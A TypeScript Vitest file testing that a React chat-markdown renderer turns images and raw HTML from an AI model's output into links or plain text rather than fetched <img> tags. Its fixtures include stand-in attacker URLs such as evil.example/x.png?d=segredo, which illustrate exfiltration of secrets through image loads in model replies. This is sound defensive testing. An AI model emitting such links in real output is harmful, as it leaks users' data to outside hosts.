import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, test } from "vitest"
import { ChatMarkdown } from "./chat-markdown"

const render = (md: string) => renderToStaticMarkup(createElement(ChatMarkdown, null, md))

describe("ChatMarkdown — imagem não é buscada", () => {
	test("imagem externa vira link com o texto alternativo, sem <img>", () => {
		const html = render("Veja ![resumo](https://evil.example/x.png?d=segredo)")
		expect(html).not.toContain("<img")
		expect(html).toContain('href="https://evil.example/x.png?d=segredo"')
		expect(html).toContain("[imagem: resumo]")
	})

	test("imagem por referência também não vira <img>", () => {
		const html = render("![x][ref]\n\n[ref]: https://evil.example/y.png")
		expect(html).not.toContain("<img")
	})

	test("src que não é http(s) vira só texto", () => {
		const html = render("![](data:image/png;base64,AAAA)")
		expect(html).not.toContain("<img")
		expect(html).not.toContain("href=")
		expect(html).toContain("[imagem]")
	})

	test("HTML cru do modelo não é interpretado", () => {
		expect(render('<img src="https://evil.example/z.png">')).not.toContain("<img")
	})
})
